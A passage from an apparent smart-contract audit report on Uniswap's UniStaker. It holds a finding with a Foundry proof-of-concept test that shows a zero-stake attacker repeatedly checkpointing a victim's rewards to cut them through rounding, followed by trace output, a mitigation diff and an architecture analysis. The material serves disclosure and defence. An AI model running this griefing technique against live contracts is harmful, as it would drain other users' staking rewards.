The reason for the test failure was that due to an increased number of alternatives tried, Foundry's fuzz testing engine picked admin's address to mint to, and thus [this assertion](https://github.com/code-423n4/2024-02-uniswap-foundation/blob/5a2761c8277541a24bc551fbd624413b384bea94/test/UniStaker.t.sol#L414) failed as a result. We have repaired the failing test by disallowing to mint governance tokens to admin's address.

## [10] Applying the changes to the UniStaker testing infrastructure, and running the tests

To correctly set up the environment and apply the modifications, do the following:

- `git clone https://github.com/code-423n4/2024-02-uniswap-foundation.git`
- `cd 2024-02-uniswap-foundation`
- `forge install uniswap/v3-core`
- `forge install uniswap/v3-periphery`
- Download [this gist](https://gist.github.com/kuprumion/b7b0e03ea52ff925d0f9a9a4dcd7116f), and unpack it e.g. into `../uni`;
- Place the files as follows inside the repo:
  - `cp ../uni/foundry.toml ./`
  - `cp ../uni/Uni.sol ./test/mocks/`
  - `cp ../uni/Uni.handler.sol ./test/helpers/`
  - `cp ../uni/UniStaker.handler.sol ./test/helpers/`
  - `cp ../uni/AddressSet.sol ./test/helpers/`
  - `cp ../uni/UniStaker.t.sol ./test/`
  - `cp ../uni/UniStaker.invariants.t.sol ./test/`

Then, execute the tests (excluding the integration tests) via this command:

```sh
forge test --nmp '*integration*'
```

To execute and examine the working of the newly introduced invariant, we recommend to focus on it and execute it in verbose mode:

```sh
forge test -vvvv --nmp '*integration*' --match-test invariant_Total_stake_plus_direct_delegations_equals_current_votes
```

## [[11] Small stakes reward griefing due to rounding, and actions by anyone with nothing at stake](https://github.com/code-423n4/2024-02-uniswap-foundation-findings/issues/388)

*Note: At the judge’s request [here](https://github.com/code-423n4/2024-02-uniswap-foundation-findings/issues/299#issuecomment-1997457762), this downgraded issue from the same warden has been included in this report for completeness.*

https://github.com/code-423n4/2024-02-uniswap-foundation/blob/491c7f63e5799d95a181be4a978b2f074dc219a5/src/UniStaker.sol#L256-L261<br>
https://github.com/code-423n4/2024-02-uniswap-foundation/blob/491c7f63e5799d95a181be4a978b2f074dc219a5/src/UniStaker.sol#L292-L303<br>
https://github.com/code-423n4/2024-02-uniswap-foundation/blob/491c7f63e5799d95a181be4a978b2f074dc219a5/src/UniStaker.sol#L315-L334<br>
https://github.com/code-423n4/2024-02-uniswap-foundation/blob/491c7f63e5799d95a181be4a978b2f074dc219a5/src/UniStaker.sol#L342-L346<br>
https://github.com/code-423n4/2024-02-uniswap-foundation/blob/491c7f63e5799d95a181be4a978b2f074dc219a5/src/UniStaker.sol#L360-L373<br>
https://github.com/code-423n4/2024-02-uniswap-foundation/blob/491c7f63e5799d95a181be4a978b2f074dc219a5/src/UniStaker.sol#L382-L402<br>
https://github.com/code-423n4/2024-02-uniswap-foundation/blob/491c7f63e5799d95a181be4a978b2f074dc219a5/src/UniStaker.sol#L453-L457<br>
https://github.com/code-423n4/2024-02-uniswap-foundation/blob/491c7f63e5799d95a181be4a978b2f074dc219a5/src/UniStaker.sol#L466-L492<br>
https://github.com/code-423n4/2024-02-uniswap-foundation/blob/491c7f63e5799d95a181be4a978b2f074dc219a5/src/UniStaker.sol#L499-L503<br>
https://github.com/code-423n4/2024-02-uniswap-foundation/blob/491c7f63e5799d95a181be4a978b2f074dc219a5/src/UniStaker.sol#L512-L532

### Impact

Whenever any operation with the given user as a beneficiary is performed, this user's rewards are checkpointed via function [`_checkpointReward()`](https://github.com/code-423n4/2024-02-uniswap-foundation/blob/491c7f63e5799d95a181be4a978b2f074dc219a5/src/UniStaker.sol#L764-L767), which calculates the reward checkpoint by a call to function [`unclaimedReward()`](https://github.com/code-423n4/2024-02-uniswap-foundation/blob/491c7f63e5799d95a181be4a978b2f074dc219a5/src/UniStaker.sol#L241-L247):

```solidity
  function unclaimedReward(address _beneficiary) public view returns (uint256) {
    return unclaimedRewardCheckpoint[_beneficiary]
      + (
        earningPower[_beneficiary]
          * (rewardPerTokenAccumulated() - beneficiaryRewardPerTokenCheckpoint[_beneficiary])
      ) / SCALE_FACTOR;
  }
```

The problem with the above function is that it allows for rounding errors, in that it divides by the large `SCALE_FACTOR = 1e36`, which is intended exactly to prevent rounding errors (but in another place). More specifically, the rounding errors happen when:

- The user stake is relatively small (thus, `earningPower[_beneficiary]` is small).
- The reward amount is relatively small.
- A small period of time has passed since the previous checkpoint (thus, the second factor becomes small as well).

The last aspect is controllable by any external user (an attacker), which may have zero stake in the system, and still designate the grieved user as a beneficiary, and the attacker can also do it as frequently as needed (e.g. every block). The vulnerable functions are almost all externally callable functions:

- `stake()`, `permitAndStake`, `stakeOnBehalf()`: allow to deposit a zero stake, and to designate arbitrary user as a beneficiary.
- `stakeMore()`, `permitAndStakeMore()`, `stakeMoreOnBehalf()`: allow to extend an existing stake with an additional zero amount, while checkpointing the same beneficiary.
- `alterBeneficiary()`, `alterBeneficiaryOnBehalf()`: allow to change deposit beneficiary to an arbitrary user, while checkpointing two users simultaneously (the old and the new beneficiary).
- `withdraw()`, `withdrawOnBehalf()`: allow to withdraw a zero amount, also from a zero stake.

Any of those functions can be called by an attacker who doesn't need to stake anything (nothing at stake).  As a result, the attacked user will be eligible to disproportionately smaller rewards than other users that staked the same amounts, over the same period of time.

### Proof of Concept

The test below demonstrates the exploit; to be placed in [test/UniStaker.t.sol](https://github.com/code-423n4/2024-02-uniswap-foundation/blob/491c7f63e5799d95a181be4a978b2f074dc219a5/test/UniStaker.t.sol#L2709). All amounts are within the bounds as provided by the functions `_boundToRealisticStake()` and `_boundToRealisticReward()`. Instead of `stakeMore()`, an attacker could employ any of the vulnerable functions listed above.

```diff
diff --git a/test/UniStaker.t.sol b/test/UniStaker.t.sol
index 89124f8..9a01043 100644
--- a/test/UniStaker.t.sol
+++ b/test/UniStaker.t.sol
@@ -2708,2 +2708,50 @@ contract UniStakerRewardsTest is UniStakerTest {
 contract NotifyRewardAmount is UniStakerRewardsTest {
+  function test_SmallStakesRewardGriefing() public {
+    address _user1 = address(1);
+    address _user2 = address(2);
+    address _user3 = address(3);
+    address _delegatee = address(4);
+    address _attacker = address(5);
+
+    // Mint necessary amounts
+    uint256 _smallDepositAmount = 0.1e18; // from _boundToRealisticStake
+    uint256 _largeDepositAmount = 25_000_000e18; // from _boundToRealisticStake
+    _mintGovToken(_user1, _smallDepositAmount);
+    _mintGovToken(_user2, _smallDepositAmount);
+    _mintGovToken(_user3, _largeDepositAmount);
+
+    // Notify of the rewards
+    uint256 _rewardAmount = 1e14; // from _boundToRealisticReward
+    rewardToken.mint(rewardNotifier, _rewardAmount);
+    vm.startPrank(rewardNotifier);
+    rewardToken.transfer(address(uniStaker), _rewardAmount);
+    uniStaker.notifyRewardAmount(_rewardAmount);
+    vm.stopPrank();
+
+    // Users stake for themselves
+    _stake(_user1, _smallDepositAmount, _delegatee);
+    _stake(_user2, _smallDepositAmount, _delegatee);
+    _stake(_user3, _largeDepositAmount, _delegatee);
+
+    // _attacker has zero funds
+    assertEq(govToken.balanceOf(_attacker), 0);
+
+    // The attack: every block _attacker deposits 0 stake
+    // and assigns _user1 as beneficiary,
+    // thus leading to frequent updates of the reward checkpoint for _user1
+    // with the rounding errors accumulating
+    UniStaker.DepositIdentifier _depositId = _stake(_attacker, 0, _delegatee, _user1);
+    for(uint i = 0; i < 1000; ++i) {
+      _jumpAhead(10); // a conservative 10 seconds between blocks
+      vm.startPrank(_attacker);
+      uniStaker.stakeMore(_depositId, 0);
+      vm.stopPrank();
+    }
+
+    console2.log("Unclaimed reward for _user1: ", uniStaker.unclaimedReward(_user1));
+    console2.log("Unclaimed reward for _user2: ", uniStaker.unclaimedReward(_user2));
+    // This assertion fails: _user1 can now claim substantially less rewards than _user2
+    assertLteWithinOnePercent(uniStaker.unclaimedReward(_user1), uniStaker.unclaimedReward(_user2));
+  }
+
   function testFuzz_UpdatesTheRewardRate(uint256 _amount) public {
```

Run the test using `forge test -vvvv --nmp '*integration*' --match-test test_SmallStakesRewardGriefing`.
Notice that exploit succeeds if the test fails; the failing test prints then the following output, showing that `_user1` may claim only `1000` in rewards, contrary to `_user2`, who staked the same amount but may claim `1543` in rewards.

```sh
    ├─ [0] VM::startPrank(0x0000000000000000000000000000000000000005)
    │   └─ ← ()
    ├─ [14341] UniStaker::stakeMore(3, 0)
    │   ├─ [4113] Governance Token::transferFrom(0x0000000000000000000000000000000000000005, DelegationSurrogate: [0x4f81992FCe2E1846dD528eC0102e6eE1f61ed3e2], 0)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000005, to: DelegationSurrogate: [0x4f81992FCe2E1846dD528eC0102e6eE1f61ed3e2], value: 0)
    │   │   └─ ← true
    │   ├─ emit StakeDeposited(owner: 0x0000000000000000000000000000000000000005, depositId: 3, amount: 0, depositBalance: 0)
    │   └─ ← ()
    ├─ [0] VM::stopPrank()
    │   └─ ← ()
    ├─ [2293] UniStaker::unclaimedReward(0x0000000000000000000000000000000000000001) [staticcall]
    │   └─ ← 1000
    ├─ [0] console::log("Unclaimed reward for _user1: ", 1000) [staticcall]
    │   └─ ← ()
    ├─ [2293] UniStaker::unclaimedReward(0x0000000000000000000000000000000000000002) [staticcall]
    │   └─ ← 1543
    ├─ [0] console::log("Unclaimed reward for _user2: ", 1543) [staticcall]
    │   └─ ← ()
    ├─ [2293] UniStaker::unclaimedReward(0x0000000000000000000000000000000000000001) [staticcall]
    │   └─ ← 1000
    ├─ [2293] UniStaker::unclaimedReward(0x0000000000000000000000000000000000000002) [staticcall]
    │   └─ ← 1543
    ├─ emit log(val: "Error: a >= 0.99 * b not satisfied")
    ├─ emit log_named_uint(key: "  Expected", val: 1543)
    ├─ emit log_named_uint(key: "    Actual", val: 1000)
    ├─ emit log_named_uint(key: "  minBound", val: 1527)
    ├─ [0] VM::store(VM: [0x7109709ECfa91a80626fF3989D68f67F5b1DD12D], 0x6661696c65640000000000000000000000000000000000000000000000000000, 0x0000000000000000000000000000000000000000000000000000000000000001)
    │   └─ ← ()
    └─ ← ()

Test result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 466.54s
```

### Tools Used

Foundry

### Recommended Mitigation Steps

We recommend the following simple change to be applied to `src/Unistaker.sol`, which avoids division by `SCALE_FACTOR` when storing checkpoints internally, and instead divides by it only when the rewards are claimed:

```diff
diff --git a/src/UniStaker.sol b/src/UniStaker.sol
index babdc1a..237b833 100644
--- a/src/UniStaker.sol
+++ b/src/UniStaker.sol
@@ -239,9 +239,9 @@ contract UniStaker is INotifiableRewardReceiver, Multicall, EIP712, Nonces {
   /// until it is reset to zero once the beneficiary account claims their unearned rewards.
   /// @return Live value of the unclaimed rewards earned by a given beneficiary account.
   function unclaimedReward(address _beneficiary) public view returns (uint256) {
-    return unclaimedRewardCheckpoint[_beneficiary]
-      + (
-        earningPower[_beneficiary]
+    return (
+        unclaimedRewardCheckpoint[_beneficiary]
+        + earningPower[_beneficiary]
           * (rewardPerTokenAccumulated() - beneficiaryRewardPerTokenCheckpoint[_beneficiary])
       ) / SCALE_FACTOR;
   }
@@ -746,7 +746,7 @@ contract UniStaker is INotifiableRewardReceiver, Multicall, EIP712, Nonces {
     unclaimedRewardCheckpoint[_beneficiary] = 0;
     emit RewardClaimed(_beneficiary, _reward);
 
-    SafeERC20.safeTransfer(REWARD_TOKEN, _beneficiary, _reward);
+    SafeERC20.safeTransfer(REWARD_TOKEN, _beneficiary, _reward / SCALE_FACTOR);
   }
 
   /// @notice Checkpoints the global reward per token accumulator.
@@ -762,7 +762,11 @@ contract UniStaker is INotifiableRewardReceiver, Multicall, EIP712, Nonces {
   /// accumulator has been checkpointed. It assumes the global `rewardPerTokenCheckpoint` is up to
   /// date.
   function _checkpointReward(address _beneficiary) internal {
-    unclaimedRewardCheckpoint[_beneficiary] = unclaimedReward(_beneficiary);
+    unclaimedRewardCheckpoint[_beneficiary] += (
+        earningPower[_beneficiary]
+          * (rewardPerTokenAccumulated() - beneficiaryRewardPerTokenCheckpoint[_beneficiary])
+      );
+
     beneficiaryRewardPerTokenCheckpoint[_beneficiary] = rewardPerTokenAccumulatedCheckpoint;
   }
```

This change alleviates the problem completely. Now, the output from the previously failing test reads:

```sh
    ├─ [0] VM::startPrank(0x0000000000000000000000000000000000000005)
    │   └─ ← ()
    ├─ [14185] UniStaker::stakeMore(3, 0)
    │   ├─ [4113] Governance Token::transferFrom(0x0000000000000000000000000000000000000005, DelegationSurrogate: [0x4f81992FCe2E1846dD528eC0102e6eE1f61ed3e2], 0)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000005, to: DelegationSurrogate: [0x4f81992FCe2E1846dD528eC0102e6eE1f61ed3e2], value: 0)
    │   │   └─ ← true
    │   ├─ emit StakeDeposited(owner: 0x0000000000000000000000000000000000000005, depositId: 3, amount: 0, depositBalance: 0)
    │   └─ ← ()
    ├─ [0] VM::stopPrank()
    │   └─ ← ()
    ├─ [2293] UniStaker::unclaimedReward(0x0000000000000000000000000000000000000001) [staticcall]
    │   └─ ← 1543
    ├─ [0] console::log("Unclaimed reward for _user1: ", 1543) [staticcall]
    │   └─ ← ()
    ├─ [2293] UniStaker::unclaimedReward(0x0000000000000000000000000000000000000002) [staticcall]
    │   └─ ← 1543
    ├─ [0] console::log("Unclaimed reward for _user2: ", 1543) [staticcall]
    │   └─ ← ()
    ├─ [2293] UniStaker::unclaimedReward(0x0000000000000000000000000000000000000001) [staticcall]
    │   └─ ← 1543
    ├─ [2293] UniStaker::unclaimedReward(0x0000000000000000000000000000000000000002) [staticcall]
    │   └─ ← 1543
    └─ ← ()

Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 247.92ms    
```

Besides that, we recommend to apply minimal input validation to all vulnerable functions listed above: allow to stake only above some minimal amount (no zero stakes), disallow to alter beneficiary to the same address, disallow withdrawing zero amounts, etc. While in itself such actions may seem harmless, leaving functions that accept insensible inputs in the system, in combination with other potential problems, may open the way to exploits.

### Assessed type

Math

**[wildmolasses (Uniswap) acknowledged and commented](https://github.com/code-423n4/2024-02-uniswap-foundation-findings/issues/299#issuecomment-1992314009):**
 > Some decent callouts here; although nothing was found, we appreciate the rigor. I think we would like to mark high quality, thanks warden!

**[0xTheC0der (judge) commented](https://github.com/code-423n4/2024-02-uniswap-foundation-findings/issues/299#issuecomment-1997621087):**
 > The majority of initial H/M findings which were downgraded to QA exceed the present QA reports in value provided, and none of the present QA reports stand out enough in terms of valid and valuable Low findings to be selected for report. As a consequence, the current report was selected due to its high quality, diligence and value provided to the sponsor.

***

# Audit Analysis

For this audit, 20 analysis reports were submitted by wardens. An analysis report examines the codebase as a whole, providing observations and advice on such topics as architecture, mechanism, or approach. The [report highlighted below](https://github.com/code-423n4/2024-02-uniswap-foundation-findings/issues/312) by **roguereggiant** received the top score from the judge.

*The following wardens also submitted reports: [hunter\_w3b](https://github.com/code-423n4/2024-02-uniswap-foundation-findings/issues/341), [kaveyjoe](https://github.com/code-423n4/2024-02-uniswap-foundation-findings/issues/110), [McToady](https://github.com/code-423n4/2024-02-uniswap-foundation-findings/issues/58), [peanuts](https://github.com/code-423n4/2024-02-uniswap-foundation-findings/issues/399), [Sathish9098](https://github.com/code-423n4/2024-02-uniswap-foundation-findings/issues/389), [0xepley](https://github.com/code-423n4/2024-02-uniswap-foundation-findings/issues/347), [Aamir](https://github.com/code-423n4/2024-02-uniswap-foundation-findings/issues/322), [fouzantanveer](https://github.com/code-423n4/2024-02-uniswap-foundation-findings/issues/320), [hassanshakeel13](https://github.com/code-423n4/2024-02-uniswap-foundation-findings/issues/310), [MSK](https://github.com/code-423n4/2024-02-uniswap-foundation-findings/issues/307), [LinKenji](https://github.com/code-423n4/2024-02-uniswap-foundation-findings/issues/298), [SAQ](https://github.com/code-423n4/2024-02-uniswap-foundation-findings/issues/285), [Myd](https://github.com/code-423n4/2024-02-uniswap-foundation-findings/issues/279), [ihtishamsudo](https://github.com/code-423n4/2024-02-uniswap-foundation-findings/issues/278), [emerald7017](https://github.com/code-423n4/2024-02-uniswap-foundation-findings/issues/266), [aariiif](https://github.com/code-423n4/2024-02-uniswap-foundation-findings/issues/252), [ZanyBonzy](https://github.com/code-423n4/2024-02-uniswap-foundation-findings/issues/153), [cudo](https://github.com/code-423n4/2024-02-uniswap-foundation-findings/issues/139), and [Al-Qa-qa](https://github.com/code-423n4/2024-02-uniswap-foundation-findings/issues/100).*


## Project Overview

UniStaker is a mechanism designed to facilitate the collection and distribution of protocol fees generated by the Uniswap V3 pools through UNI token staking. This setup allows Uniswap Governance to enable and manage these protocol fees effectively. By integrating contracts from this repository, Uniswap Governance could maintain the authority to set protocol fees for Uniswap V3 Pools without directly handling the fee assets. Instead, the fees generated are distributed in a trustless manner to UNI holders who opt to stake their tokens. The unique aspect of this system is that rewards for stakers are not in the form of fee tokens directly but in a predefined token established at the deployment of these contracts. The accumulated fees from each pool are periodically auctioned to entities willing to exchange them for the specified token, thereby facilitating the distribution of rewards to stakers.

The operational framework of UniStaker is built around two core contracts: V3FactoryOwner.sol and UniStaker.sol. The V3FactoryOwner contract functions as the new owner of the Uniswap V3 Factory, allowing governance to transfer factory ownership to this contract while retaining control over fee settings through a governance mechanism. On the other hand, the UniStaker contract is responsible for the distribution of staking rewards, employing a mechanism that allows rewards to drip over a fixed period, similar to the Synthetix StakingRewards.sol model. This contract enables UNI stakers to maintain their governance rights, designate beneficiaries for their rewards, and manage their stakes on a per-deposit basis, introducing efficiencies in terms of precision, gas usage, and code clarity. Additionally, UniStaker is designed to accommodate rewards from various sources, with the potential for future expansion beyond Uniswap V3 protocol fees, under the administration of Uniswap Governance.

| File Name | Description |
| -- | -- | 
| UniStaker.sol | The code defines a smart contract, UniStaker, responsible for managing the distribution of staking rewards in the form of ERC20 tokens to participants who deposit a specific governance token. It allows for flexible management of staking positions, enabling users to delegate voting power, specify reward beneficiaries, and alter these designations while participating in a reward distribution mechanism inspired by Synthetix's model. |
| V3FactoryOwner.sol | The code defines V3FactoryOwner, a contract serving as the owner of the Uniswap v3 factory, allowing an admin (expected to be Uniswap Governance) to manage fee settings on pools and the factory itself. It enables a public function for collecting protocol fees from pools in exchange for a specified token, aiming to create a competitive market for fee collection. |
| DelegationSurrogate.sol | DelegationSurrogate is a streamlined contract designed to hold governance tokens on behalf of users while delegating their voting power to a specified delegatee. This approach enables individual token holders to maintain their governance rights by using a separate surrogate for each delegatee, even when their tokens are pooled together under a single contract. |

## Architecture Diagram

The architecture diagram below illustrates the interaction between various components of the system, focusing on governance token delegation and staking rewards distribution. This system allows governance token holders to stake their tokens, delegate their voting power, and earn rewards, all while maintaining their governance rights.

*Note: to view the provided image, please see the original submission [here](https://github.com/code-423n4/2024-02-uniswap-foundation-findings/issues/312).*

### Architecture Overview

1. **Token Holders** represent individuals or entities that own governance tokens. They have the option to stake these tokens in a staking contract to earn rewards and participate in governance by delegating their voting power.

2. **Staking Contract** is the central hub where token holders stake their governance tokens to earn rewards. It interacts with other system components to manage staked tokens and distribute rewards.

3. **DelegationSurrogate** is deployed by the staking contract for each delegatee. Its purpose is to hold staked governance tokens and delegate voting power to a specified delegatee, allowing token holders to maintain their governance rights even when their tokens are pooled together.

4. **Rewards Distribution Mechanism** is responsible for distributing rewards to token holders based on the amount of tokens they have staked and other criteria defined by the system.

5. **Delegatee** is an individual or entity to which the DelegationSurrogate delegates voting power. This allows them to vote in governance proposals on behalf of the token holders who have staked their tokens.

6. **Uniswap V3 Factory** is part of the broader ecosystem, where the staking contract might interact with Uniswap V3 to manage liquidity pools, set fees, or perform other actions related to the governance of Uniswap V3 pools.

7. **Uniswap V3 Pools** are liquidity pools managed by the Uniswap V3 Factory, which can be influenced by governance decisions made by the staking contract, delegatees, or directly by token holders.

## Sequence Diagram

This architecture enables a decentralized and democratic governance system where token holders can earn rewards while participating in the governance of the protocol or ecosystem they are invested in. It balances the need for efficient governance token management with the desire to empower individual token holders.
Below is a sequence diagram illustrating the interactions within the system, focusing on the process of staking tokens, delegating voting power, and distributing rewards.

*Note: to view the provided image, please see the original submission [here](https://github.com/code-423n4/2024-02-uniswap-foundation-findings/issues/312).*

### Sequence Diagram Overview

1. **Token Holder** initiates the process by staking their governance tokens in the **Staking Contract**.

2. For each stake, the **Staking Contract** either deploys a new **Delegation Surrogate** or selects an existing one, based on the designated **Delegatee**.

3. The **Delegation Surrogate** then delegates the voting power of the staked tokens to the specified **Delegatee**, ensuring that token holders retain their governance rights.

4. Parallelly or subsequently, the **Staking Contract** communicates with the **Rewards Distribution Mechanism** to calculate the rewards for each token holder based on the staked tokens and other criteria.

5. The **Rewards Distribution Mechanism** distributes the calculated rewards back to the **Token Holder**.

6. Optionally, the **Token Holder** might directly delegate their voting power to a **Delegatee**, bypassing the staking mechanism for governance participation.

7. Optionally, the **Staking Contract** might interact with the **Uniswap V3 Factory** for liquidity pool management or other governance actions. The **Uniswap V3 Factory** updates the **Staking Contract** with any changes to pool status or information.

This sequence outlines the flow of actions from staking tokens to receiving rewards while ensuring governance participation through delegation.

## Overview of Functions in the UniStaker Smart Contract

*Note: to view the provided image, please see the original submission [here](https://github.com/code-423n4/2024-02-uniswap-foundation-findings/issues/312).*

### Admin and Reward Notifier Management

- **`setAdmin`**: Updates the admin of the contract. Only the current admin can perform this action.
- **`setRewardNotifier`**: Enables or disables a reward notifier address, allowing or disallowing it from notifying the contract about new rewards. This action is also restricted to the admin.

### Staking Operations

- **`stake`**: Allows a user to stake tokens into a new deposit, automatically delegating voting power and setting themselves as the reward beneficiary.
- **`stakeMore`**: Enables adding more tokens to an existing stake, maintaining the current delegatee and beneficiary settings.
- **`permitAndStake`**: Similar to `stake`, but includes an ERC-20 permit for token approval, reducing transaction steps.
- **`stakeOnBehalf`**: Allows staking on behalf of another user, with their permission, enabling the staker to specify delegatee and beneficiary.
- **`stakeMoreOnBehalf`**: Adds more tokens to an existing deposit on behalf of another user, with their permission.

### Delegation and Beneficiary Management

- **`alterDelegatee`**: Changes the delegatee for a specific deposit, allowing the stake's voting power to be redirected.
- **`alterDelegateeOnBehalf`**: Similar to `alterDelegatee`, but performed on behalf of the deposit owner with their permission.
- **`alterBeneficiary`**: Changes the beneficiary who earns rewards from a specific deposit.
- **`alterBeneficiaryOnBehalf`**: Allows changing the beneficiary on behalf of the deposit owner, with their permission.

### Withdrawal and Reward Claiming

- **`withdraw`**: Withdraws staked tokens from a deposit, reducing the stake and potentially affecting reward earnings.
- **`withdrawOnBehalf`**: Performs a withdrawal on behalf of the deposit owner, with their permission.
- **`claimReward`**: Allows a beneficiary to claim their earned rewards.
- **`claimRewardOnBehalf`**: Claims rewards on behalf of a beneficiary, with their permission.

### Reward Notification

- **`notifyRewardAmount`**: Called by authorized reward notifiers to inform the contract about new rewards being added. It adjusts the reward rate and duration accordingly.

### Internal Helper Functions

- **`_fetchOrDeploySurrogate`**: Deploys or retrieves a Delegation Surrogate contract for a specified delegatee.
- **`_stakeTokenSafeTransferFrom`**: Safely transfers staked tokens from one address to another.
- **`_useDepositId`**: Generates a unique identifier for a new deposit.
- **`_stake`**: Core logic for staking operations, handling token transfers, and setting deposit parameters.
- **`_stakeMore`**: Adds tokens to an existing stake, updating the total staked amount and rewards.
- **`_alterDelegatee`**: Updates the delegatee for a deposit, managing the delegation of voting power.
- **`_alterBeneficiary`**: Changes the beneficiary for a deposit, affecting who earns the rewards.
- **`_withdraw`**: Handles the withdrawal of staked tokens from a deposit.
- **`_claimReward`**: Processes reward claims, transferring earned rewards to beneficiaries.
- **`_checkpointGlobalReward`**: Updates the global reward rate and distribution end time based on new rewards.
- **`_checkpointReward`**: Updates the reward calculation for a specific beneficiary.
- **`_setAdmin`**: Sets the admin address internally.
- **`_revertIfNotAdmin`**: Checks if the caller is the admin and reverts if not.
- **`_revertIfNotDepositOwner`**: Ensures the caller owns the deposit they are trying to modify.
- **`_revertIfAddressZero`**: Checks for zero addresses in critical parameters.
- **`_revertIfSignatureIsNotValidNow`**: Validates EIP-712 signatures for actions performed on behalf of others.

This contract facilitates complex staking, delegation, and rewards management operations, integrating with ERC-20 tokens and leveraging DeFi conventions for governance and reward distribution.

## UniStaker Smart Contract Functionalities Overview

### Main Functionalities

- **Stake Tokens**: Allows users to deposit governance tokens into the contract to participate in staking. Users can choose to delegate their voting power to a specific delegatee and designate a beneficiary for their rewards.
- **Withdraw Tokens**: Permits stakers to withdraw their deposited tokens from the contract. This action ceases their participation in reward distribution.
- **Claim Rewards**: Enables beneficiaries to claim their accrued rewards. The rewards are calculated based on the proportion of the user's stake relative to the total staked amount and the duration for which the tokens were staked.

### Delegation and Beneficiary Management

- **Delegate Voting Power**: Through the creation or selection of a Delegation Surrogate, stakers can delegate the voting power of their staked tokens to a chosen delegatee, allowing them to participate in governance decisions.
- **Alter Delegatee**: Stakers have the flexibility to change the delegatee to whom their voting power is assigned.
- **Designate or Change Beneficiary**: Stakers can specify or change the beneficiary address that will receive the staking rewards for their deposit.

### Reward Notification and Distribution

- **Notify Reward Amount**: Authorized entities can notify the contract about new rewards that have been added to the pool. This resets the reward distribution duration and updates the rate at which rewards are distributed.

### Administration and Permissions

- **Set Admin**: Designates a new admin for the contract. Only the current admin can perform this action.
- **Enable/Disable Reward Notifier**: Allows the admin to authorize or revoke the permission of addresses to notify the contract of new rewards.

### Utility and Maintenance

- **Fetch or Deploy Surrogate**: Internally handles the deployment of a new Delegation Surrogate contract or selects an existing one for a specific delegatee.
- **Safe Transfer Operations**: Ensures the safe transfer of tokens to and from the contract, adhering to the ERC20 standard's security practices.
- **Checkpoints and Accumulators**: Manages checkpoints for global reward distribution and individual beneficiary reward accumulation to ensure accurate and fair reward calculations.

### Security and Validation

- **Unauthorized Access Handling**: The contract includes several checks to prevent unauthorized actions, such as altering delegatees or beneficiaries, withdrawing tokens, and managing admin functions.
- **Signature Validation**: Supports operations on behalf of users through EIP-712 compliant signatures, ensuring that actions such as staking, withdrawing, and claiming rewards are securely authorized.

### Events

- **Emitted Events**: The contract emits events for significant actions, including deposits, withdrawals, changes in delegatees or beneficiaries, reward claims, and administrative changes. These events facilitate transparency and allow tracking of contract activities.

This smart contract introduces a comprehensive system for staking governance tokens, managing voting power delegation, and distributing rewards. It emphasizes user autonomy by allowing stakers to retain their governance rights through delegation and to designate beneficiaries for their rewards. The contract's security measures, including checks for unauthorized access and signature validation, ensure the integrity of its operations.

*Note: to view the provided image, please see the original submission [here](https://github.com/code-423n4/2024-02-uniswap-foundation-findings/issues/312).*

This sequence diagram outlines the interactions between a user, the UniStaker contract, ERC20 tokens, the Delegation Surrogate, and a reward notifier within the UniStaker system. It demonstrates the flow of stake deposits, stake modifications, withdrawals, reward claims, and reward notifications, emphasizing the contract's role in managing staked tokens, delegating voting power, and distributing rewards.

## V3FactoryOwner Smart Contract Functionalities Overview

### Contract Purpose and Overview

The V3FactoryOwner contract acts as the owner of the Uniswap V3 factory, enabling privileged control over factory and pool settings, including fee management. It also allows the collection of protocol fees from pools through a public function, facilitating an arbitrage opportunity by trading a designated token amount for pool fees.

*Note: to view the provided image, please see the original submission [here](https://github.com/code-423n4/2024-02-uniswap-foundation-findings/issues/312).*

### Key Functionalities

**Administrative Control**

- **Set Admin**: Assigns a new admin to the contract, transferring the ability to perform privileged actions. Only the current admin can execute this change.
- **Set Payout Amount**: Updates the amount of the payout token required for claiming fees from a pool. This function is reserved for the admin.

**Fee Management**

- **Enable Fee Amount**: Allows the admin to enable new fee tiers within the Uniswap V3 factory, specifying the fee amount and associated tick spacing.
- **Set Fee Protocol**: Grants the admin the ability to set protocol fee percentages for individual Uniswap V3 pools, adjusting the split between liquidity providers and the protocol.

**Fee Claiming**

- **Claim Fees**: Open to any caller, this function enables the collection of accumulated protocol fees from a specified Uniswap V3 pool. The caller must pay a predetermined amount of a designated payout token, which is then forwarded to a specified reward receiver.

**Constructor and Initialization**

Upon deployment, the constructor initializes the contract by setting:
- The admin address, who will have exclusive rights to perform certain actions within the contract.
- The Uniswap V3 Factory contract instance, which this contract will own and manage.
- The payout token, used as payment for claiming pool fees.
- The initial payout amount, specifying how much of the payout token must be paid to claim pool fees.
- The reward receiver contract, which will be notified and receive the payout token when pool fees are claimed.

**Events**

- **`FeesClaimed`**: Emitted when protocol fees are claimed from a pool, indicating the pool address, caller, recipient of the fees, and the amounts of token0 and token1 claimed.
- **`AdminSet`**: Signals the assignment of a new admin for the contract.
- **`PayoutAmountSet`**: Announces changes to the payout amount required for claiming pool fees.

**Error Handling**

- **Unauthorized**: Indicates an attempt to perform an action reserved for the admin by an unauthorized address.
- **Invalid Address**: Used when an operation involves an address parameter that must not be the zero address, such as setting a new admin.
- **Invalid Payout Amount**: Triggered when attempting to set a zero payout amount, which is not allowed.
- **Insufficient Fees Collected**: Occurs if the actual fees collected from a pool are less than the amount requested by the caller.

**Security and Permission Checks**

- **`_revertIfNotAdmin`**: A modifier-like internal function that ensures only the admin can perform certain actions, reinforcing the contract's security by restricting sensitive operations.

### Summary

The V3FactoryOwner contract is a critical component for managing Uniswap V3 factory settings, including fee structures and protocol fee collection. Its design focuses on providing administrative control over key parameters while enabling an innovative mechanism for protocol fee collection. Through its public claim fees function, it incentivizes external parties to participate in protocol fee collection, creating a competitive market dynamic. This sequence diagram shows the over all flow of the functionality:

*Note: to view the provided image, please see the original submission [here](https://github.com/code-423n4/2024-02-uniswap-foundation-findings/issues/312).*

## DelegationSurrogate Smart Contract Functionalities Detailed Overview

### Contract Purpose

The `DelegationSurrogate` contract is designed to facilitate governance participation for token holders whose tokens are pooled. It addresses the challenge of maintaining individual governance rights in a pooled environment by allowing the delegation of voting power from pooled tokens to a specified delegatee.

*Note: to view the provided image, please see the original submission [here](https://github.com/code-423n4/2024-02-uniswap-foundation-findings/issues/312).*

### Key Functionalities

**Constructor and Initial Setup**

Upon deployment, the constructor performs crucial initializations to set up the contract's core functionality:

